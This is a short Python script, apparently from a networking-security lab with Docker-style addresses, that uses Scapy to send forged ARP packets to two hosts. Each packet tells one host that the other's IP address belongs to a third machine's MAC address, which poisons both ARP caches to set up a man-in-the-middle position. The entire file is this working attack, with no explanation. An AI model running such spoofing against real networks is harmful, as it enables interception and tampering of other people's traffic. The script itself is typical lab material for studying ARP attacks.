#!/usr/bin/python3
from scapy.all import *

def arp_req(dstMAC, srcMAC, dstIP, srcIP):
    E = Ether( dst = dstMAC, src = srcMAC)
    A = ARP( hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP )

    pkt = E/A
    pkt.show()

    sendp(pkt)

arp_req('02:42:0a:09:00:05', '02:42:0a:09:00:69', '10.9.0.5', '10.9.0.6')
arp_req('02:42:0a:09:00:06', '02:42:0a:09:00:69', '10.9.0.6', '10.9.0.5')
